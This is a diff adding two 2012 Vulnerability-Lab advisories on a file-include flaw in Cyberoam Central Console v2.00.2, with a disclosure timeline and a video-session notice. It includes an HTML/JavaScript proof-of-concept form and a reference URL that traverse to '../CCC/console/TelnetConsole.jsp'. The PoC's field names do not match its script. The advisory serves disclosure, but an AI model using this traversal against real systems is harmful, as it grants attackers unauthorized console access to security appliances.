@@ -1,0 +1,226 @@
+Title:
+======
+Cyberoam Central Console v2.00.2 - File Include Vulnerability
+
+
+Date:
+=====
+2012-02-08
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=405
+
+
+VL-ID:
+=====
+405
+
+
+Introduction:
+=============
+Cyberoam Central Console (CCC) appliances offer the flexibility of hardware CCC appliances and virtual CCC 
+appliances to provide centralized security management across distributed Cyberoam UTM appliances, enabling 
+high levels of security for MSSPs and large enterprises. With Layer 8 Identity-based policies and centralized 
+reports and alerts, CCC hardware and virtual appliances provide granular security and visibility into remote 
+and branch offices across the globe. 
+
+(Copy of the Vendor Homepage: http://www.cyberoam.com/ccc.html)
+
+
+Abstract:
+=========
+Vulnerability-Lab Team discovered a  File Include Vulnerability on the Cyberoam Central Console Appliance Application.
+
+
+Report-Timeline:
+================
+2012-02-01:	Vendor Notification
+2012-02-05:	Vendor Response/Feedback
+2012-02-08:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+Elitecore Technologie
+Product: Cyberoam Central Console v2.00.2
+
+
+Exploitation-Technique:
+=======================
+Local
+
+
+Severity:
+=========
+High
+
+
+Details:
+========
+A critical File Include vulnerability is detected on the Cyberoam Central Console v2.00.2x. The vulnerability allows an 
+attacker to request local system or application files (example:telnet-service jsp). Successful exploitation can result 
+in dbms or service/appliance compromise via file include vulnerability.
+
+Vulnerable Module(s): 
+
+					[+] WWWHELP Service
+
+Affected Version(s):
+					[+] Cyberoam Central Console v2.00.2
+
+Picture(s):
+					../1.png
+
+
+Proof of Concept:
+=================
+The vulnerability can be exploited by remote attackers with low privileged accounts & without user inter action. For demonstration or reproduce ...
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>Cyberoam Cyberoam Central Console Appliance Application - Remote Exploit v1.37</title><script language="JavaScript">
+
+var dir="/onlinehelp/wwhelp/wwhimpl/js/html/"
+var file="/wwhelp.htm?"
+var parameter ="#context=Online_help&file="
+var shell="../CCC/console/TelnetConsole.jsp"
+
+function command() {
+if (document.rfi.target1.value==""){
+alert("EXPLOITATION FAILED!");
+return false;
+}
+rfi.action= document.rfi.target1.value+dir+file+parameter+shell;
+rfi.submit();
+}
+</script></head>
+<body bgcolor="#000000"><center>
+<p><font size="4"><b><font face="Verdana" color="#008000">- <font color="#999999">Cyberoam Central Console [CCC] 
+Appliance Application</font> <font color="#990000">- Remote Exploit v1.37</font> -</font></b></font></p>
+<p><br><iframe name="getting" height="337" width="633" scrolling="yes" frameborder="0"></iframe>
+</p><form method="post" target="getting" name="rfi" onSubmit="command();">
+  <p><b><font face="Arial" size="2" color="#FF0000">TARGET:</font><font face="Arial" size="2" color="#808080"> http://target.[COM]/</font> 
+  <font color="#FF0000" size="2"> </font></b>
+      <input type="text" name="target12" size="50" style="background-color: #006633" onMouseOver="javascript:this.style.background='#808080';" 
+
+onMouseOut="javascript:this.style.background='#808000';">
+      <input type="submit" value="Request!" name="B12">
+    <input type="reset" value="Erase!" name="B22">
+  </p>
+  </form>
+</center></body></html>
+
+
+
+Vulnerable Module(s): 
+
+					[+] WWWHELP Service - (context=Online_help&file=)
+
+
+Reference(s):
+http://ccc.xxx.com/onlinehelp/wwhelp/wwhimpl/js/html/wwhelp.htm#context=Online_help&file=../CCC/console/TelnetConsole.jsp
+
+
+Solution:
+=========
+A fix/patch will be provided this week by Cyberoam & ElitCore.
+
+
+Risk:
+=====
+The security risk of the file include vulnerability is estimated as high(+).
+
+
+Credits:
+========
+Vulnerability Research Laboratory   -   N/A   Anonymous
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+
+---->
+
+Title:
+======
+Cyberoam Central Console v2.x - File Include Vulnerability Video Session
+
+
+Date:
+=====
+2012-02-08
+
+
+References:
+===========
+Download:	http://www.vulnerability-lab.com/resources/videos/411.wmv
+View: 		http://www.youtube.com/watch?v=pGJy2XNugy8
+
+
+
+VL-ID:
+=====
+411
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Offensiv
+
+
+Severity:
+=========
+High
+
+
+Details:
+========
+The video shows a live exploitation session by Benjamin Kunz Mejri.
+The video explain how to get access to a web telnet console via file include vulnerability.
+
+
+Credits:
+========
+Vulnerability Research Laboratory -   Benjamin Kunz Mejri
+
+
+Disclaimer:
+===========
+The information provided in this video is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+-- 
+Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
+Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com
+
+
